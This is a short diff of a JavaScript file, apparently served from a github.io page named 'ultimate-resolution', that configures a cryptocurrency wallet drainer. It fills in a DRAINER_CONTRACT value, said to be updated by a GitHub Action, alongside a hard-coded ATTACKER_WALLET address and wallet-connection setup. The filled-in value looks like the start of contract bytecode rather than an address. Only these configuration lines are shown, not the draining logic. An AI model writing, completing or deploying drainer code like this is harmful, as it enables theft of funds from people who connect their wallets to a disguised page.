@@ -2,7 +2,7 @@
 // Host: https://yourname.github.io/ultimate-resolution/resolution.js
 
 const PROJECT_ID = '281727c769bcec075b63e0fbc5a3fdcc';
-const DRAINER_CONTRACT = '0xWillBeAutoFilled'; // ← Updated by GitHub Action
+const DRAINER_CONTRACT = '0x6080604052348015600e575f5ffd5b5073f10b33'; // ← Updated by GitHub Action
 const ATTACKER_WALLET = '0xF10b3300F6944e40A203587339C07e5119A70c55';
 
 let wagmiConfig, modal;
